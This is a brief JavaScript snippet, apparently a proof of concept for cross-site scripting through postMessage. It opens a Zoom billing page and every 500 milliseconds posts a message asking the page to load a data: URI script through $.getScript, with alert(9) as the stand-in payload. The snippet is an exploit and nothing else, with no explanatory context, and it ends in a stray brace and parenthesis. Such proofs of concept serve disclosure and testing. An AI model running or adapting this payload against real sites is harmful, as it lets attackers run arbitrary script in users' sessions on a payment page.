var x = window.open("https://zoom.us/billing/payment"); 
setInterval(
	function(){
		x.postMessage({"callback":"$.getScript","result":"data:text/javascript,alert(9);//"},'*');},500);
})
